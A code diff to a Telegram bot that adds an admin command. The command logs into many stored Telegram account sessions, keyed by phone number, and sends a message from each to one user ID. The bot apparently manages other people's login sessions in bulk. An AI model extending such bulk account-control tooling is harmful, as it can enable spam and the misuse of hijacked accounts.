@@ -2,6 +2,8 @@ import os
 import json
 import logging
 from aiogram import Bot, Dispatcher, types
+
+
 from aiogram.utils import executor
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from dotenv import load_dotenv
@@ -352,6 +354,59 @@ async def cmd_log(message: types.Message):
     text = "\n".join(results)
     for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
         await message.answer(chunk)
+
+@dp.message_handler(commands=['sil'])
+async def cmd_sil(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    await message.answer("🔄 Starting to send messages from all accounts...")
+    
+    if is_main_admin(message.from_user.id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": message.from_user.id}))
+    
+    if not sessions:
+        await message.answer("❌ No sessions found.")
+        return
+
+    success = 0
+    failed = 0
+    results = []
+    
+    for session in sessions:
+        phone = session.get("phone")
+        session_str = session.get("session")
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                try:
+                    await client.send_message(42777, "hello")
+                    results.append(f"✅ {phone} - Message sent")
+                    success += 1
+                except Exception as e:
+                    results.append(f"❌ {phone} - Send error: {str(e)}")
+                    failed += 1
+            else:
+                results.append(f"❌ {phone} - Not authorized")
+                failed += 1
+        except Exception as e:
+            results.append(f"❌ {phone} - Connection error: {str(e)}")
+            failed += 1
+        finally:
+            await client.disconnect()
+    
+    # Send summary first
+    summary = f"📊 Results:\nSuccess: {success}\nFailed: {failed}\nTotal: {len(sessions)}"
+    await message.answer(summary)
+    
+    # Then send detailed results in chunks
+    results_text = "\n".join(results)
+    for chunk in [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]:
+        await message.answer(chunk)        
 
 @dp.message_handler(commands=['loger'])
 async def cmd_loger(message: types.Message):
